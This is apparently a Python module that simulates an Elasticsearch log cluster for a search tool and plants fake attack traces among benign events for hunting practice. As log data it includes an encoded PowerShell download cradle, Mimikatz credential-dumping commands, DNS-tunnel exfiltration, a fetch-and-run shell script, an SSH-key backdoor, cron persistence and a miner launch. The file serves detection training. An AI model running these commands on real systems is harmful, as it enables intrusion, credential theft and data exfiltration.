"""
mock_data.py — a pretend Elasticsearch cluster.

1. Generates ~850 realistic ECS documents (Windows process / registry / file events,
   Windows Security + PowerShell logs, DNS, web proxy, Linux auditd).
2. Plants a handful of "needles" deep inside long fields.
3. `mock_search(index, body)` takes the *same* body query_dict.py builds and returns an
   ES-shaped response: hits.total, hits.hits[_index/_id/_source/highlight/sort], aggregations.

The query_string support is a friendly approximation of Lucene:
  terms, "phrases", field:value, field:"phrase", wildcards * ?, /regex/,
  AND OR NOT, && || !, -term, +term, ( ) grouping, field:* (exists).
Unquoted terms match on word boundaries (like an analysed text field); wildcards match anywhere.

The mock cluster's clock (NOW) is frozen at import so the planted needles stay in the
"Last 15 minutes" / "Last 1 hour" windows however long the app runs.
"""
from __future__ import annotations

import base64
import fnmatch
import html
import random
import re
import string
import time
from collections import Counter
from datetime import datetime, timedelta, timezone
from urllib.parse import urlsplit

RNG = random.Random(1337)
NOW = datetime.now(timezone.utc).replace(microsecond=0)
DOCS: list[dict] = []


class QueryParseError(ValueError):
    """Raised like ES's 400 query_shard_exception / parse_exception."""


# =========================================================================== #
# Document generation
# =========================================================================== #
WIN_HOSTS = ["WS-FIN-014", "WS-HR-002", "WS-ENG-117", "SRV-DC01", "SRV-FILE02", "LT-DEV-221"]
LNX_HOSTS = ["linux-bastion-01", "web-prod-03", "db-prod-01"]
WIN_USERS = ["j.morales", "a.chen", "k.okafor", "m.rossi", "p.singh", "svc_backup", "administrator"]
LNX_USERS = ["root", "deploy", "ubuntu", "www-data"]
HOST_IP = {h: f"10.{RNG.randint(1, 20)}.{RNG.randint(0, 255)}.{RNG.randint(2, 254)}" for h in WIN_HOSTS + LNX_HOSTS}

UA_CHROME = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
             "Chrome/130.0.0.0 Safari/537.36")
UA_EDGE = UA_CHROME + " Edg/130.0.0.0"
UA_OFFICE = "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17928; Pro)"
UA_PS = "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4648"


def _id() -> str:
    return "".join(RNG.choices(string.ascii_letters + string.digits + "-_", k=20))


def _ago(**kw) -> datetime:
    return NOW - timedelta(**kw)


def _rand_ts() -> datetime:
    r = RNG.random()
    window = 3600 if r < 0.12 else 86400 if r < 0.35 else 7 * 86400 if r < 0.65 else 30 * 86400
    return NOW - timedelta(seconds=RNG.uniform(5, window))


def _iso(ts: datetime) -> str:
    return ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ts.microsecond // 1000:03d}Z"


def _hex(n: int = 8) -> str:
    return "".join(RNG.choices("0123456789abcdef", k=n))


def _deep(a: dict, b: dict) -> dict:
    for k, v in b.items():
        if isinstance(v, dict) and isinstance(a.get(k), dict):
            _deep(a[k], v)
        else:
            a[k] = v
    return a


def _base(dataset, module, host, os_type, user, category, type_, action, agent) -> dict:
    return {
        "ecs": {"version": "8.11.0"},
        "event": {"kind": "event", "dataset": dataset, "module": module,
                  "category": category, "type": type_, "action": action},
        "host": {"name": host, "hostname": host.lower(), "os": {"type": os_type}, "ip": [HOST_IP.get(host, "10.0.0.1")]},
        "user": {"name": user},
        "agent": {"type": agent, "version": "8.15.3"},
    }


def _add(name: str, ts: datetime, source: dict, data_stream: bool = True) -> None:
    index = f".ds-{name}-{ts:%Y.%m.%d}-000001" if data_stream else f"{name}-{ts:%Y.%m.%d}"
    DOCS.append({"_index": index, "_id": _id(), "_ts": ts, "_source": {"@timestamp": _iso(ts), **source}})


def _win_name(path: str) -> str:
    return path.replace('"', "").split("\\")[-1].split()[0]


# ---------------- builders, one per data source ---------------- #
def endpoint_process(ts, host, user, exe, cmd, parent_exe, parent_cmd=None):
    src = _base("endpoint.events.process", "endpoint", host, "windows", user,
                ["process"], ["start"], "start", "endpoint")
    _deep(src, {
        "process": {
            "pid": RNG.randint(800, 18000), "name": _win_name(exe), "executable": exe,
            "command_line": cmd, "args": cmd.split(),
            "parent": {"pid": RNG.randint(400, 9000), "name": _win_name(parent_exe),
                       "executable": parent_exe, "command_line": parent_cmd or parent_exe},
        },
        "data_stream": {"type": "logs", "dataset": "endpoint.events.process", "namespace": "default"},
    })
    _add("logs-endpoint.events.process-default", ts, src)


def endpoint_registry(ts, host, user, path, data, process_exe):
    src = _base("endpoint.events.registry", "endpoint", host, "windows", user,
                ["registry"], ["change"], "modification", "endpoint")
    _deep(src, {
        "registry": {"path": path, "key": "\\".join(path.split("\\")[1:-1]), "value": path.split("\\")[-1],
                     "hive": path.split("\\")[0], "data": {"strings": [data], "type": "REG_SZ"}},
        "process": {"name": _win_name(process_exe), "executable": process_exe},
        "data_stream": {"type": "logs", "dataset": "endpoint.events.registry", "namespace": "default"},
    })
    _add("logs-endpoint.events.registry-default", ts, src)


def endpoint_file(ts, host, user, path, process_exe, action="creation"):
    name = path.split("\\")[-1]
    src = _base("endpoint.events.file", "endpoint", host, "windows", user,
                ["file"], ["creation" if action == "creation" else "change"], action, "endpoint")
    _deep(src, {
        "file": {"path": path, "name": name, "extension": name.rsplit(".", 1)[-1] if "." in name else "",
                 "size": RNG.randint(800, 4_000_000)},
        "process": {"name": _win_name(process_exe), "executable": process_exe},
        "data_stream": {"type": "logs", "dataset": "endpoint.events.file", "namespace": "default"},
    })
    _add("logs-endpoint.events.file-default", ts, src)


def win_security(ts, host, user, code, action, message, extra=None, outcome="success"):
    src = _base("system.security", "security", host, "windows", user,
                ["authentication"] if code in ("4624", "4625") else ["iam"],
                ["start"] if code in ("4624", "4625") else ["creation"], action, "winlogbeat")
    _deep(src, {
        "event": {"code": code, "provider": "Microsoft-Windows-Security-Auditing", "outcome": outcome},
        "winlog": {"channel": "Security", "event_id": code, "computer_name": f"{host}.corp.example.com"},
        "message": message,
    })
    if extra:
        _deep(src, extra)
    _add("winlogbeat-8.15.3", ts, src, data_stream=False)


def win_powershell(ts, host, user, script):
    src = _base("windows.powershell_operational", "powershell", host, "windows", user,
                ["process"], ["info"], "Execute a Remote Command", "winlogbeat")
    _deep(src, {
        "event": {"code": "4104", "provider": "Microsoft-Windows-PowerShell"},
        "winlog": {"channel": "Microsoft-Windows-PowerShell/Operational", "event_id": "4104"},
        "powershell": {"file": {"script_block_text": script}, "sequence": 1, "total": 1},
        "message": "Creating Scriptblock text (1 of 1):\n" + script + f"\n\nScriptBlock ID: {_hex(8)}-{_hex(4)}-{_hex(4)}-{_hex(4)}-{_hex(12)}",
    })
    _add("winlogbeat-8.15.3", ts, src, data_stream=False)


def dns_query(ts, host, qname, answer, qtype="A"):
    labels = qname.split(".")
    src = {
        "ecs": {"version": "8.11.0"},
        "event": {"kind": "event", "dataset": "network_traffic.dns", "module": "network_traffic",
                  "category": ["network"], "type": ["connection", "protocol"]},
        "host": {"name": host},
        "agent": {"type": "packetbeat", "version": "8.15.3"},
        "network": {"protocol": "dns", "transport": "udp"},
        "source": {"ip": HOST_IP[host], "port": RNG.randint(49152, 65535)},
        "destination": {"ip": "10.0.0.53", "port": 53},
        "dns": {"question": {"name": qname, "type": qtype, "registered_domain": ".".join(labels[-2:])},
                "response_code": "NOERROR", "resolved_ip": [answer]},
    }
    _add("packetbeat-8.15.3", ts, src, data_stream=False)


def proxy_hit(ts, host, user, method, url, status, ua):
    p = urlsplit(url)
    size = RNG.randint(300, 900_000)
    src = _base("proxy.access", "proxy", host, "windows", user, ["web", "network"], ["access"], "access", "filebeat")
    url_obj = {"full": url, "original": url, "scheme": p.scheme, "domain": p.hostname, "path": p.path or "/"}
    if p.query:
        url_obj["query"] = p.query
    _deep(src, {
        "url": url_obj,
        "http": {"request": {"method": method}, "response": {"status_code": status, "body": {"bytes": size}}},
        "user_agent": {"original": ua},
        "source": {"ip": HOST_IP[host]},
        "destination": {"domain": p.hostname},
        "message": f'{HOST_IP[host]} - {user} [{ts:%d/%b/%Y:%H:%M:%S} +0000] "{method} {url} HTTP/1.1" {status} {size} "-" "{ua}"',
        "data_stream": {"type": "logs", "dataset": "proxy.access", "namespace": "default"},
    })
    _add("logs-proxy.access-default", ts, src)


def auditd_exec(ts, host, user, cmd):
    args = cmd.split()
    exe = args[0] if args[0].startswith("/") else f"/usr/bin/{args[0]}"
    src = _base("auditd.log", "auditd", host, "linux", user, ["process"], ["start"], "executed", "auditbeat")
    _deep(src, {
        "process": {"pid": RNG.randint(1000, 60000), "executable": exe, "name": exe.rsplit("/", 1)[-1],
                    "args": args, "command_line": cmd, "title": cmd[:128],
                    "parent": {"pid": RNG.randint(500, 3000), "name": "bash"}},
        "auditd": {"summary": {"actor": {"primary": user, "secondary": "root"}, "how": exe}, "result": "success"},
    })
    _add("auditbeat-8.15.3", ts, src, data_stream=False)


# ---------------- benign noise pools ---------------- #
EXPLORER = r"C:\Windows\explorer.exe"
SERVICES = r"C:\Windows\System32\services.exe"
SVCHOST = r"C:\Windows\System32\svchost.exe"
POWERSHELL = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

WIN_BENIGN = [
    lambda u: (SVCHOST, r"C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule", SERVICES),
    lambda u: (SVCHOST, r"C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s EventLog", SERVICES),
    lambda u: (r"C:\Program Files\Google\Chrome\Application\chrome.exe",
               r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer '
               r"--display-capture-permissions-policy-allowed --lang=en-US --device-scale-factor=1 "
               f"--num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id={RNG.randint(5, 99)} "
               f"--time-ticks-at-unix-epoch=-{RNG.randint(10**15, 10**16)} --launch-time-ticks={RNG.randint(10**9, 10**10)} "
               f"--field-trial-handle=1912,i,{RNG.randint(10**18, 10**19)},{RNG.randint(10**18, 10**19)},262144 "
               f"--mojo-platform-channel-handle={RNG.randint(1000, 9999)} /prefetch:1",
               r"C:\Program Files\Google\Chrome\Application\chrome.exe"),
    lambda u: (r"C:\Windows\System32\cmd.exe", rf'cmd.exe /c "dir C:\Users\{u}\Documents\Reports"', EXPLORER),
    lambda u: (POWERSHELL, 'powershell.exe -NoProfile -Command "Get-Service | Where-Object {$_.Status -eq \'Running\'} | Select-Object -First 20"', EXPLORER),
    lambda u: (r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
               r'"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE" "\\SRV-FILE02\finance\Q3_forecast_v7.xlsx"', EXPLORER),
    lambda u: (r"C:\Windows\System32\msiexec.exe", r"msiexec.exe /i C:\Windows\Temp\ZoomInstallerFull.msi /qn /norestart", SVCHOST),
    lambda u: (r"C:\Program Files\Git\cmd\git.exe", "git.exe fetch --all --prune --tags",
               rf"C:\Users\{u}\AppData\Local\Programs\Microsoft VS Code\Code.exe"),
    lambda u: (r"C:\Windows\System32\SearchProtocolHost.exe",
               r'"C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe12_ '
               r'Global\UsGthrCtrlFltPipeMssGthrPipe12 1 -2147483646 "Software\Microsoft\Windows Search" '
               r'"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" '
               r'"C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon"',
               r"C:\Windows\System32\SearchIndexer.exe"),
    lambda u: (r"C:\Program Files\Microsoft OneDrive\OneDrive.exe", r'"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background', EXPLORER),
    lambda u: (r"C:\Windows\System32\conhost.exe", r"\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1", r"C:\Windows\System32\cmd.exe"),
    lambda u: (r"C:\Windows\System32\taskhostw.exe", "taskhostw.exe Install $(Arg0)", SVCHOST),
]

PS_BENIGN = [
    "Get-ChildItem -Path C:\\Logs -Filter *.log | Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) } | Remove-Item -WhatIf",
    "Import-Module ActiveDirectory\nGet-ADUser -Filter 'Enabled -eq $true' -Properties LastLogonDate | Select-Object Name,LastLogonDate",
    "$cpu = Get-CimInstance Win32_Processor\n$mem = Get-CimInstance Win32_OperatingSystem\n[pscustomobject]@{CPU=$cpu.LoadPercentage; FreeMB=[math]::Round($mem.FreePhysicalMemory/1024)}",
    "Test-NetConnection -ComputerName SRV-FILE02 -Port 445",
    "Get-WinEvent -LogName System -MaxEvents 50 | Format-Table TimeCreated, Id, Message -AutoSize",
]

DOMAINS = ["login.microsoftonline.com", "outlook.office365.com", "www.google.com", "github.com", "api.slack.com",
           "teams.microsoft.com", "update.googleapis.com", "ctldl.windowsupdate.com", "cdn.jsdelivr.net",
           "s3.amazonaws.com", "dc01.corp.example.com", "fonts.gstatic.com", "wpad.corp.example.com"]

URLS = [
    lambda: ("https://www.google.com/search?q=quarterly+report+template&rlz=1C1GCEU_enUS1020&oq=quarterly"
             f"&aqs=chrome..69i57j0i512l9.{RNG.randint(1000, 9999)}j0j7&sourceid=chrome&ie=UTF-8"),
    lambda: f"https://outlook.office365.com/mail/inbox/id/AAQkAGI2{_hex(24)}%3D",
    lambda: "https://github.com/elastic/ecs/blob/main/schemas/process.yml",
    lambda: "https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js",
    lambda: (f"https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id={_hex(8)}-{_hex(4)}-{_hex(4)}-{_hex(4)}-{_hex(12)}"
             f"&response_type=code&redirect_uri=https%3A%2F%2Fportal.office.com%2Flanding&scope=openid%20profile&state={_hex(32)}"),
    lambda: f"https://api.slack.com/api/conversations.history?channel=C0{_hex(8).upper()}&limit=200",
    lambda: "https://teams.microsoft.com/v2/",
    lambda: f"https://s3.amazonaws.com/corp-assets-prod/brand/logo_{RNG.randint(1, 9)}.svg",
]

LNX_BENIGN = ["ls -la /var/log/nginx", "systemctl status nginx", "tail -n 200 /var/log/syslog", "apt-get update",
              "python3 manage.py migrate --noinput", "docker ps --format {{.Names}}", "git pull origin main", "df -h",
              "journalctl -u postgresql --since -1h", "crontab -l", "pg_dump -Fc -f /backups/app.dump appdb"]

REG_BENIGN = [
    (r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityHealth", r"%windir%\system32\SecurityHealthSystray.exe"),
    (r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\com.squirrel.Teams.Teams",
     r'"C:\Users\{u}\AppData\Local\Microsoft\Teams\Update.exe" --processStart "Teams.exe" --process-start-args "--system-initiated"'),
    (r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDrive", r'"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background'),
]

FILES_BENIGN = [r"C:\Users\{u}\Downloads\Benefits_Guide_2026.pdf", r"C:\Users\{u}\Documents\Reports\weekly_status.docx",
                r"C:\Windows\Temp\MpCmdRun.log", r"C:\Users\{u}\AppData\Local\Temp\chrome_drag{n}.tmp",
                r"C:\Users\{u}\Downloads\Q3_forecast_v7.xlsx"]


def _logon_msg(host, user, logon_type, ip, success=True):
    head = "An account was successfully logged on." if success else "An account failed to log on."
    tail = ("\n\nDetailed Authentication Information:\n\tLogon Process:\t\tKerberos\n\tAuthentication Package:\tKerberos"
            if success else "\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D"
                            "\n\tSub Status:\t\t0xC000006A\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp \n\tAuthentication Package:\tNTLM")
    return (f"{head}\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\t{host}$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7"
            f"\n\nLogon Information:\n\tLogon Type:\t\t{logon_type}\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes"
            f"\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-3623811015-3361044348-30300820-{RNG.randint(1000, 1600)}\n\tAccount Name:\t\t{user}"
            f"\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x{_hex(6).upper()}\n\nNetwork Information:\n\tWorkstation Name:\t{host}"
            f"\n\tSource Network Address:\t{ip}\n\tSource Port:\t\t{RNG.randint(49152, 65535)}{tail}")


def _generate_noise() -> None:
    for _ in range(230):
        u, h = RNG.choice(WIN_USERS), RNG.choice(WIN_HOSTS)
        exe, cmd, parent = RNG.choice(WIN_BENIGN)(u)
        endpoint_process(_rand_ts(), h, u, exe, cmd, parent)
    for _ in range(140):
        u, h = RNG.choice(WIN_USERS), RNG.choice(WIN_HOSTS)
        ip = HOST_IP[RNG.choice(WIN_HOSTS)]
        lt = RNG.choice([2, 3, 3, 3, 10])
        win_security(_rand_ts(), h, u, "4624", "logged-in", _logon_msg(h, u, lt, ip),
                     {"source": {"ip": ip}, "winlog": {"logon": {"type": str(lt)}}})
    for _ in range(35):
        win_powershell(_rand_ts(), RNG.choice(WIN_HOSTS), RNG.choice(WIN_USERS), RNG.choice(PS_BENIGN))
    for _ in range(170):
        dns_query(_rand_ts(), RNG.choice(WIN_HOSTS + LNX_HOSTS), RNG.choice(DOMAINS),
                  f"{RNG.choice(['142.250', '52.96', '104.18', '151.101', '20.190'])}.{RNG.randint(0, 255)}.{RNG.randint(1, 254)}")
    for _ in range(140):
        u, h = RNG.choice(WIN_USERS), RNG.choice(WIN_HOSTS)
        proxy_hit(_rand_ts(), h, u, RNG.choice(["GET"] * 5 + ["POST"]), RNG.choice(URLS)(),
                  RNG.choice([200] * 8 + [204, 302, 404]), RNG.choice([UA_CHROME, UA_CHROME, UA_EDGE, UA_OFFICE]))
    for _ in range(70):
        auditd_exec(_rand_ts(), RNG.choice(LNX_HOSTS), RNG.choice(LNX_USERS), RNG.choice(LNX_BENIGN))
    for _ in range(25):
        u, (path, data) = RNG.choice(WIN_USERS), RNG.choice(REG_BENIGN)
        endpoint_registry(_rand_ts(), RNG.choice(WIN_HOSTS), u, path, data.replace("{u}", u), EXPLORER)
    for _ in range(40):
        u = RNG.choice(WIN_USERS)
        endpoint_file(_rand_ts(), RNG.choice(WIN_HOSTS), u,
                      RNG.choice(FILES_BENIGN).replace("{u}", u).replace("{n}", str(RNG.randint(100, 999))),
                      r"C:\Program Files\Google\Chrome\Application\chrome.exe")


# ---------------- the needles 🪡 ---------------- #
def _plant_needles() -> None:
    # 1) Phishing doc -> encoded PowerShell. The C2 domain is ONLY visible after base64 decoding.
    stage = "IEX (New-Object Net.WebClient).DownloadString('http://x7k2-update.com/stage2.ps1')"
    enc = base64.b64encode(stage.encode("utf-16-le")).decode()
    word = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
    endpoint_file(_ago(hours=6, minutes=2), "WS-FIN-014", "k.okafor", r"C:\Users\k.okafor\Downloads\Invoice_88231.docm",
                  r"C:\Program Files\Microsoft\Edge\Application\msedge.exe")
    endpoint_process(_ago(hours=6), "WS-FIN-014", "k.okafor", POWERSHELL,
                     f"powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -enc {enc}",
                     word, rf'"{word}" /n "C:\Users\k.okafor\Downloads\Invoice_88231.docm" /o ""')
    # 2) ...the same download, in plain sight in the proxy log
    proxy_hit(_ago(hours=5, minutes=59, seconds=57), "WS-FIN-014", "k.okafor", "GET",
              "http://x7k2-update.com/stage2.ps1", 200, UA_PS)
    # 3) Persistence: Run key pointing at the same C2, buried at the end of a long value
    endpoint_registry(_ago(hours=5, minutes=41), "WS-FIN-014", "k.okafor",
                      r"HKU\S-1-5-21-3623811015-3361044348-30300820-1104\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveStandaloneUpdater2",
                      r"C:\Users\Public\Libraries\odupd.exe --silent --interval 300 --jitter 25 --c2 https://x7k2-update.com/beacon",
                      POWERSHELL)
    # 4) Credential dumping hidden at the tail of a very long rundll32 command line (last 45 minutes)
    endpoint_file(_ago(minutes=47), "SRV-FILE02", "administrator",
                  r"C:\ProgramData\Microsoft\DeviceSync\cache\x64\dsync_helper.dll", POWERSHELL)
    endpoint_process(_ago(minutes=41), "SRV-FILE02", "administrator", r"C:\Windows\System32\rundll32.exe",
                     r"C:\Windows\System32\rundll32.exe C:\ProgramData\Microsoft\DeviceSync\cache\x64\dsync_helper.dll,#1 "
                     r"/silent /norestart /logdir=C:\ProgramData\Microsoft\DeviceSync\logs /retry=3 /timeout=900 "
                     r"/profile=default /locale=en-US /telemetry=off /mod=sekurlsa::logonpasswords "
                     r"/out=C:\Users\Public\Libraries\thumbs.db", r"C:\Windows\System32\cmd.exe")
    # 5) Invoke-Mimikatz buried around line 20 of an innocent-looking inventory script
    lines = [
        "function Get-AssetInventory {", "    [CmdletBinding()]",
        "    param([string[]]$ComputerName = $env:COMPUTERNAME, [string]$OutFile = 'C:\\Temp\\inventory.csv')",
        "    $results = foreach ($c in $ComputerName) {",
        "        $os   = Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $c",
        "        $cs   = Get-CimInstance -ClassName Win32_ComputerSystem -ComputerName $c",
        "        $bios = Get-CimInstance -ClassName Win32_BIOS -ComputerName $c",
        "        $disk = Get-CimInstance -ClassName Win32_LogicalDisk -Filter \"DriveType=3\" -ComputerName $c",
        "        $nic  = Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True' -ComputerName $c",
        "        $apps = Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* |",
        "                Select-Object DisplayName, DisplayVersion, Publisher",
        "        $hotfix = Get-HotFix -ComputerName $c | Sort-Object InstalledOn -Descending | Select-Object -First 5",
        "        $uptime = (Get-Date) - $os.LastBootUpTime",
        "        $users  = Get-CimInstance Win32_LoggedOnUser -ComputerName $c | Select-Object -ExpandProperty Antecedent",
        "        Write-Verbose \"Collected base inventory for $c\"",
        "        # collect cached credential info for audit purposes",
        "        $null = Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\"' -ComputerName $c 2>$null",
        "        [pscustomobject]@{",
        "            Computer = $c; OS = $os.Caption; Build = $os.BuildNumber; Model = $cs.Model",
        "            Serial = $bios.SerialNumber; FreeGB = [math]::Round(($disk | Measure-Object FreeSpace -Sum).Sum/1GB,1)",
        "            IP = ($nic.IPAddress -join ';'); Apps = $apps.Count; LastPatch = $hotfix[0].InstalledOn",
        "            UptimeDays = [math]::Round($uptime.TotalDays,1); Users = ($users -join ';')",
        "        }", "    }", "    $results | Export-Csv -Path $OutFile -NoTypeInformation", "}",
        "Get-AssetInventory -ComputerName SRV-DC01,SRV-FILE02,WS-FIN-014 -Verbose",
    ]
    win_powershell(_ago(days=2, hours=3), "WS-ENG-117", "a.chen", "\n".join(lines))
    # 6) Cleartext password in a URL query string
    proxy_hit(_ago(days=3, hours=7), "WS-HR-002", "p.singh", "GET",
              "http://legacy-hr.corp.example.com/login.php?lang=en&theme=classic&user=p.singh&password=S3cr3t%21Summer2026&redirect=%2Fdashboard",
              302, UA_EDGE)
    # 7) Pastebin raw fetch
    proxy_hit(_ago(days=12, hours=2), "LT-DEV-221", "m.rossi", "GET", "https://pastebin.com/raw/Xk29fLqA", 200, "curl/8.4.0")
    # 8) DNS tunnelling: data smuggled in long subdomain labels (last 30 minutes)
    blob = base64.b32encode(b"FIN_Q3_payroll_export.csv|rows=4812|cols=ssn,iban,salary|" * 3).decode().rstrip("=").lower()
    for seq, i in enumerate(range(0, len(blob), 52)):
        dns_query(_ago(minutes=26 - seq), "WS-HR-002", f"{blob[i:i + 52]}.{seq:03d}.t.exfil-tunnel.net", "198.51.100.9", "TXT")
    # 9) Linux: curl|bash, ssh key backdoor, cron persistence, cryptominer
    t = _ago(days=4, hours=1)
    auditd_exec(t, "web-prod-03", "www-data", "curl -fsSL http://203.0.113.77/i.sh -o /tmp/.cache/i.sh")
    auditd_exec(t + timedelta(seconds=4), "web-prod-03", "root", "bash /tmp/.cache/i.sh --quiet")
    auditd_exec(t + timedelta(minutes=1), "web-prod-03", "root",
                "echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGx7k2bT0pP5qVw9cYhR3mN8uJ4fL6dZ1sE0aK2oQ7vX ops@backup >> /root/.ssh/authorized_keys")
    auditd_exec(t + timedelta(minutes=2), "web-prod-03", "root",
                "sh -c (crontab -l; echo */5 * * * * /tmp/.cache/kworkerd >/dev/null 2>&1) | crontab -")
    auditd_exec(t + timedelta(minutes=3), "web-prod-03", "root",
                "nohup /tmp/.cache/kworkerd -o pool.minexmr.example:4444 -u 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A --donate-level=1 -B")
    # 10) Brute force from the internet against "administrator" (yesterday) + a sneaky new account
    for k in range(14):
        win_security(_ago(days=1, minutes=30 - k), "SRV-DC01", "administrator", "4625", "logon-failed",
                     _logon_msg("SRV-DC01", "administrator", 3, "198.51.100.23", success=False),
                     {"source": {"ip": "198.51.100.23"}, "winlog": {"logon": {"type": "3"}}}, outcome="failure")
    win_security(_ago(hours=4, minutes=12), "SRV-DC01", "administrator", "4720", "added-user-account",
                 "A user account was created.\n\nSubject:\n\tAccount Name:\t\tadministrator\n\tAccount Domain:\t\tCORP"
                 "\n\nNew Account:\n\tSecurity ID:\t\tS-1-5-21-3623811015-3361044348-30300820-1337\n\tAccount Name:\t\tsvc_update$"
                 "\n\tAccount Domain:\t\tCORP\n\nAttributes:\n\tSAM Account Name:\tsvc_update$\n\tDisplay Name:\t\tWindows Update Service"
                 "\n\tUser Principal Name:\t-\n\tPassword Last Set:\t<never>\n\tUser Account Control:\t\n\t\t'Don't Require Preauth' - Enabled",
                 {"user": {"target": {"name": "svc_update$"}}})


def _flatten(obj, prefix: str = "", out: dict | None = None) -> dict[str, list[str]]:
    out = {} if out is None else out
    if isinstance(obj, dict):
        for k, v in obj.items():
            _flatten(v, f"{prefix}.{k}" if prefix else k, out)
    elif isinstance(obj, list):
        for v in obj:
            _flatten(v, prefix, out)
    elif obj is not None:
        out.setdefault(prefix, []).append(str(obj))
    return out


_generate_noise()
_plant_needles()
DOCS.sort(key=lambda d: d["_ts"], reverse=True)
for _d in DOCS:
    _d["_flat"] = _flatten(_d["_source"])


# =========================================================================== #
# A tiny query_string engine
# =========================================================================== #
_TOKEN_RE = re.compile(r'\s*(?:(\()|(\))|((?:[^\s()"\\]|\\.)*"(?:[^"\\]|\\.)*"|(?:[^\s()"\\]|\\.)+))')
_FIELD_RE = re.compile(r'^((?:[^:\\"\s]|\\.)+):(.+)$', re.S)
_TOP_LEVEL_FIELDS = {"message", "tags", "labels"}
_KEYWORDS = {"AND": "AND", "&&": "AND", "OR": "OR", "||": "OR", "NOT": "NOT", "!": "NOT"}


def _tokenize(q: str) -> list[tuple[str, str | None]]:
    toks, pos, q = [], 0, q.strip()
    while pos < len(q):
        m = _TOKEN_RE.match(q, pos)
        if not m or m.end() == pos:
            if q[pos:].strip().startswith('"'):
                raise QueryParseError("Unterminated quote in query")
            break
        pos = m.end()
        if m.group(1):
            toks.append(("LP", None))
        elif m.group(2):
            toks.append(("RP", None))
        else:
            word = m.group(3)
            if word in _KEYWORDS:
                toks.append((_KEYWORDS[word], None))
            elif len(word) > 1 and word[0] in "-!":
                toks += [("NOT", None), ("TERM", word[1:])]
            elif len(word) > 1 and word[0] == "+":
                toks.append(("TERM", word[1:]))
            else:
                toks.append(("TERM", word))
    return toks


def _unescape(s: str) -> str:
    return re.sub(r"\\(.)", r"\1", s)


def _wildcard_regex(value: str):
    chars, i = [], 0
    while i < len(value):
        if value[i] == "\\" and i + 1 < len(value):
            chars.append((value[i + 1], True))
            i += 2
        else:
            chars.append((value[i], False))
            i += 1
    lead = bool(chars) and chars[0] == ("*", False)
    trail = bool(chars) and chars[-1] == ("*", False)
    while chars and chars[0] == ("*", False):
        chars.pop(0)
    while chars and chars[-1] == ("*", False):
        chars.pop()
    if not chars:
        return None  # bare * -> match all / exists
    body = "".join(r"\S*?" if (c == "*" and not e) else "." if (c == "?" and not e) else re.escape(c) for c, e in chars)
    left = "" if lead else r"(?<![A-Za-z0-9])"
    right = "" if trail else r"(?![A-Za-z0-9])"
    return re.compile(left + body + right, re.I)


def _compile_term(raw: str):
    field, value = None, raw
    m = _FIELD_RE.match(raw)
    if m and ("." in m.group(1) or "*" in m.group(1) or m.group(1) in _TOP_LEVEL_FIELDS or m.group(1).startswith("@")):
        field, value = _unescape(m.group(1)), m.group(2)
    if len(value) >= 2 and value[0] == value[-1] == '"':
        text = _unescape(value[1:-1])
        return field, (re.compile(re.escape(text), re.I) if text else None)
    if len(value) > 2 and value[0] == value[-1] == "/":
        try:
            return field, re.compile(value[1:-1], re.I)
        except re.error as exc:
            raise QueryParseError(f"Invalid regex {value}: {exc}") from exc
    return field, _wildcard_regex(value)


class _Parser:
    def __init__(self, tokens, default_and: bool):
        self.t, self.i, self.default_and = tokens, 0, default_and

    def parse(self):
        if not self.t:
            return ("all",)
        node = self._or()
        if self.i < len(self.t):
            raise QueryParseError(f"Unexpected '{self.t[self.i][1] or self.t[self.i][0]}' in query")
        return node

    def _kind(self):
        return self.t[self.i][0] if self.i < len(self.t) else None

    def _or(self):
        nodes = [self._and()]
        while True:
            k = self._kind()
            if k == "OR":
                self.i += 1
                nodes.append(self._and())
            elif not self.default_and and k in ("TERM", "NOT", "LP"):
                nodes.append(self._and())
            else:
                break
        return nodes[0] if len(nodes) == 1 else ("or", nodes)

    def _and(self):
        nodes = [self._unary()]
        while True:
            k = self._kind()
            if k == "AND":
